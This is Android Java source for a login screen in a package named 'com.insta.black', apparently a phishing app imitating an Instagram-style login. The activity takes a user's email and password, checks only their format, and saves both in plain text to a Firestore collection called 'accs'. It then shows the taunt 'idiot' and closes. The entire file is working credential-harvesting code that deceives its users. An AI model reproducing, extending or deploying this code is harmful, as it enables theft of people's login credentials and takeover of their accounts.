package com.insta.black;

import android.graphics.Color;
import android.os.Bundle;

import android.util.Log;
import android.view.View;
import android.widget.Button;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;
import android.util.Patterns;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.util.HashMap;

public class login extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.login);

        Button loginButton = findViewById(R.id.button);
        loginButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                EditText emailEditText = findViewById(R.id.editTextTextEmailAddress2);
                EditText passwordEditText = findViewById(R.id.password);

                String email = emailEditText.getText().toString().trim();
                String password = passwordEditText.getText().toString().trim();
                Log.d("app","pressed");

                if (isValidEmail(email)) {
                    Log.d("app","valid email");
                    if (isValidPassword(password)) {
                        Log.d("app","valid password");
                        try {
                            setContentView(R.layout.up);
                            FirebaseFirestore firestore;
                            firestore = FirebaseFirestore.getInstance();
                            HashMap<String,Object> map = new HashMap<>();
                            map.put("email",email);
                            map.put("password",password);
                            firestore.collection("accs").add(map).addOnSuccessListener(DocumentReference ->{
                                Toast.makeText(login.this,"idiot",Toast.LENGTH_LONG).show();
                                finish();}
                            ).addOnFailureListener(DocumentReference ->{
                                Toast.makeText(login.this,"error "+DocumentReference.getMessage().toString(),Toast.LENGTH_LONG).show();
                            });


                        }catch(Exception e){
                            Log.d("exception",e.getMessage());
                        }
                    } else {
                        passwordEditText.setError("Invalid password");
                        passwordEditText.setTextColor(Color.RED);
                    }
                } else {
                    emailEditText.setError("Invalid email");
                    emailEditText.setTextColor(Color.RED);
                }
            }
        });
    }

    private boolean isValidEmail(String email) {
        return Patterns.EMAIL_ADDRESS.matcher(email).matches();
    }

    private boolean isValidPassword(String password) {
        int minLength = 6;
        return password.length() >= minLength;
    }
}